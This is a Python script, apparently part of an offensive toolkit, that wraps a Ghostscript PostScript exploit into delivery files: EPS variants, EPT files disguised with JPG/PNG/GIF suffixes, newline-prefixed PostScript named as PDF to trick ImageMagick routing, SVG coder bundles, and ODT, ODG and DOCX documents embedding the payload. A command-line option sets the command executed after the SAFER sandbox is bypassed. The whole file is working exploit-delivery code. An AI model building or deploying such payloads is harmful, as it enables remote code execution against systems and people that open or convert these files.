#!/usr/bin/env python3
"""Package the standalone Ghostscript exploit into common delivery sinks.

The core PostScript exploit is produced by build_payload.py in this directory.
This script wraps that PostScript in the container and extension formats used
by the various Ghostscript front ends (direct gs, ImageMagick coder routing,
and office documents that embed EPS images).
"""
from __future__ import annotations

import argparse
import struct
import sys
import textwrap
import zipfile
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

import build_payload

DEFAULT_COMMAND = build_payload.DEFAULT_COMMAND
PAYLOADS_DIR = SCRIPT_DIR / "payloads"

SINK_OUTPUT_NAMES = {
    "ps": "payload.ps",
    "eps": "payload.eps",
    "epsf": "payload.epsf",
    "epsi": "payload.epsi",
    "epi": "payload.epi",
    "pdf": "payload.pdf",
    "ept": "payload.ept",
    "jpg-ept": "payload_ept.jpg",
    "png-ept": "payload_ept.png",
    "gif-ept": "payload_ept.gif",
    "svg-epsi": "svg-epsi",
    "svg-epi": "svg-epi",
    "svg-epsf": "svg-epsf",
    "odg": "payload.odg",
    "odt": "payload.odt",
    "docx": "payload.docx",
}
ALL_SINKS = tuple(SINK_OUTPUT_NAMES)

ODF_MIMETYPES = {
    "odg": "application/vnd.oasis.opendocument.graphics",
    "odt": "application/vnd.oasis.opendocument.text",
}


def ps_to_eps(ps: str) -> bytes:
    lines = ps.splitlines()
    if lines and lines[0].startswith("%!"):
        lines = lines[1:]
    eps = "\n".join(
        [
            "%!PS-Adobe-3.0 EPSF-3.0",
            "%%BoundingBox: 0 0 60 60",
            "%%Pages: 1",
            "%%LanguageLevel: 2",
            "%%EndComments",
            *lines,
            "",
        ]
    )
    return eps.encode("ascii")


def ps_to_shifted_pdf_payload(ps: str) -> bytes:
    return b"\n" + ps.encode("ascii")


def ps_to_ept(ps: str) -> bytes:
    payload = b"\n" + ps_to_eps(ps)
    header_size = 30
    header = struct.pack(
        "<IIIIIIIH",
        0xC6D3D0C5,
        header_size,
        len(payload),
        0,
        0,
        0,
        0,
        0xFFFF,
    )
    return header + payload


def odf_content_xml(document_format: str) -> str:
    if document_format == "odt":
        return textwrap.dedent(
            """\
            <?xml version="1.0" encoding="UTF-8"?>
            <office:document-content
              xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
              xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"
              xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"
              xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
              xmlns:xlink="http://www.w3.org/1999/xlink"
              office:version="1.3">
              <office:body>
                <office:text>
                  <text:p>
                    <draw:frame draw:name="payload" text:anchor-type="paragraph"
                      svg:width="5cm" svg:height="5cm">
                      <draw:image xlink:href="Pictures/payload.eps"
                        xlink:type="simple" xlink:show="embed"
                        xlink:actuate="onLoad"/>
                    </draw:frame>
                  </text:p>
                </office:text>
              </office:body>
            </office:document-content>
            """
        )

    return textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8"?>
        <office:document-content
          xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
          xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"
          xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"
          xmlns:xlink="http://www.w3.org/1999/xlink"
          office:version="1.3">
          <office:body>
            <office:drawing>
              <draw:page draw:name="page1">
                <draw:frame draw:name="payload" svg:x="1cm" svg:y="1cm"
                  svg:width="5cm" svg:height="5cm">
                  <draw:image xlink:href="Pictures/payload.eps"
                    xlink:type="simple" xlink:show="embed"
                    xlink:actuate="onLoad"/>
                </draw:frame>
              </draw:page>
            </office:drawing>
          </office:body>
        </office:document-content>
        """
    )


def odf_styles_xml() -> str:
    return textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8"?>
        <office:document-styles
          xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
          office:version="1.3">
        </office:document-styles>
        """
    )


def odf_manifest_xml(root_media_type: str) -> str:
    return textwrap.dedent(
        f"""\
        <?xml version="1.0" encoding="UTF-8"?>
        <manifest:manifest
          xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"
          manifest:version="1.3">
          <manifest:file-entry manifest:full-path="/"
            manifest:media-type="{root_media_type}"/>
          <manifest:file-entry manifest:full-path="content.xml"
            manifest:media-type="text/xml"/>
          <manifest:file-entry manifest:full-path="styles.xml"
            manifest:media-type="text/xml"/>
          <manifest:file-entry manifest:full-path="Pictures/payload.eps"
            manifest:media-type="application/postscript"/>
        </manifest:manifest>
        """
    )


def write_odf(path: Path, eps: bytes, document_format: str) -> None:
    media_type = ODF_MIMETYPES[document_format]
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr(
            zipfile.ZipInfo("mimetype"),
            media_type,
            compress_type=zipfile.ZIP_STORED,
        )
        zf.writestr("content.xml", odf_content_xml(document_format))
        zf.writestr("styles.xml", odf_styles_xml())
        zf.writestr("META-INF/manifest.xml", odf_manifest_xml(media_type))
        zf.writestr("Pictures/payload.eps", eps)


def write_docx(path: Path, eps: bytes) -> None:
    content_types = textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
          <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
          <Default Extension="xml" ContentType="application/xml"/>
          <Default Extension="eps" ContentType="image/x-eps"/>
          <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
        </Types>
        """
    )
    root_rels = textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
          <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
        </Relationships>
        """
    )
    document_rels = textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
          <Relationship Id="rIdImg" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/payload.eps"/>
        </Relationships>
        """
    )
    document_xml = textwrap.dedent(
        """\
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <w:document
          xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
          xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
          xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
          xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
          <w:body>
            <w:p>
              <w:r>
                <w:drawing>
                  <wp:inline distT="0" distB="0" distL="0" distR="0">
                    <wp:extent cx="1800000" cy="1800000"/>
                    <wp:docPr id="1" name="payload"/>
                    <a:graphic>
                      <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:pic>
                          <pic:nvPicPr>
                            <pic:cNvPr id="1" name="payload"/>
                            <pic:cNvPicPr/>
                          </pic:nvPicPr>
                          <pic:blipFill>
                            <a:blip r:embed="rIdImg"/>
                            <a:stretch><a:fillRect/></a:stretch>
                          </pic:blipFill>
                          <pic:spPr>
                            <a:xfrm>
                              <a:off x="0" y="0"/>
                              <a:ext cx="1800000" cy="1800000"/>
                            </a:xfrm>
                            <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>
                          </pic:spPr>
                        </pic:pic>
                      </a:graphicData>
                    </a:graphic>
                  </wp:inline>
                </w:drawing>
              </w:r>
            </w:p>
          </w:body>
        </w:document>
        """
    )

    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", root_rels)
        zf.writestr("word/document.xml", document_xml)
        zf.writestr("word/_rels/document.xml.rels", document_rels)
        zf.writestr("word/media/payload.eps", eps)


def write_svg_coder_bundle(path: Path, coder: str, eps: bytes) -> None:
    if path.suffix.lower() == ".svg":
        outdir = path.parent
        svg_path = path
        payload_name = f"{path.stem}_payload.jpg"
    else:
        outdir = path
        svg_path = outdir / "driver.svg"
        payload_name = "payload.jpg"

    outdir.mkdir(parents=True, exist_ok=True)
    (outdir / payload_name).write_bytes(b"\n" + eps)
    svg = textwrap.dedent(
        f"""\
        <?xml version="1.0"?>
        <svg xmlns="http://www.w3.org/2000/svg"
             xmlns:xlink="http://www.w3.org/1999/xlink"
             width="60" height="60">
          <image xlink:href="{coder}:{payload_name}"
                 href="{coder}:{payload_name}"
                 x="0" y="0" width="60" height="60"/>
        </svg>
        """
    )
    svg_path.write_text(svg, encoding="ascii")


def build_postscript(command: str, trace: bool) -> str:
    return build_payload.build_postscript(command, trace_stages=trace)


def write_sink(path: Path, sink: str, ps: str) -> None:
    if sink == "ps":
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(ps, encoding="ascii")
        return

    if sink == "pdf":
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(ps_to_shifted_pdf_payload(ps))
        return

    eps = ps_to_eps(ps)
    if sink in {"eps", "epsf", "epsi", "epi"}:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(eps)
    elif sink in {"ept", "jpg-ept", "png-ept", "gif-ept"}:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(ps_to_ept(ps))
    elif sink in {"svg-epsi", "svg-epi", "svg-epsf"}:
        write_svg_coder_bundle(path, sink.removeprefix("svg-").upper(), eps)
    elif sink in ODF_MIMETYPES:
        write_odf(path, eps, sink)
    elif sink == "docx":
        write_docx(path, eps)
    else:
        raise SystemExit(f"unsupported sink: {sink}")


def default_output(sink: str) -> Path:
    if sink == "all":
        return PAYLOADS_DIR
    return PAYLOADS_DIR / SINK_OUTPUT_NAMES[sink]


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Package the Ghostscript exploit for common delivery sinks."
    )
    parser.add_argument(
        "sink",
        choices=(*ALL_SINKS, "all"),
        help=(
            "payload sink, or all. Useful ImageMagick routing modes include "
            "pdf, ept, jpg-ept, epsf, epsi, epi, and svg-epsi. "
            "pdf uses a leading newline so ImageMagick misses PS magic "
            "at offset 0 and routes extension-based PDF delegates; this chain is "
            "not encoded as an honest PDF."
        ),
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        help="output file; output directory when sink is all or an svg-* bundle",
    )
    parser.add_argument(
        "--cmd",
        default=DEFAULT_COMMAND,
        help=f"command to execute after SAFER is patched (default: {DEFAULT_COMMAND})",
    )
    parser.add_argument(
        "--trace",
        action="store_true",
        help="include verbose PostScript stage tracing",
    )
    return parser.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    ps = build_postscript(args.cmd, args.trace)
    output = args.output or default_output(args.sink)

    if args.sink == "all":
        output.mkdir(parents=True, exist_ok=True)
        for sink in ALL_SINKS:
            write_sink(output / SINK_OUTPUT_NAMES[sink], sink, ps)
        print(f"wrote {len(ALL_SINKS)} payloads under {output}", file=sys.stderr)
        return 0

    write_sink(output, args.sink, ps)
    note = ""
    if args.sink == "pdf":
        note = " (newline-prefixed PostScript with .pdf suffix)"
    elif args.sink in {"jpg-ept", "png-ept", "gif-ept"}:
        note = " (EPT bytes with image suffix)"
    elif args.sink.startswith("svg-"):
        note = " (SVG coder-prefix bundle)"
    print(f"wrote {args.sink} payload to {output}{note}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
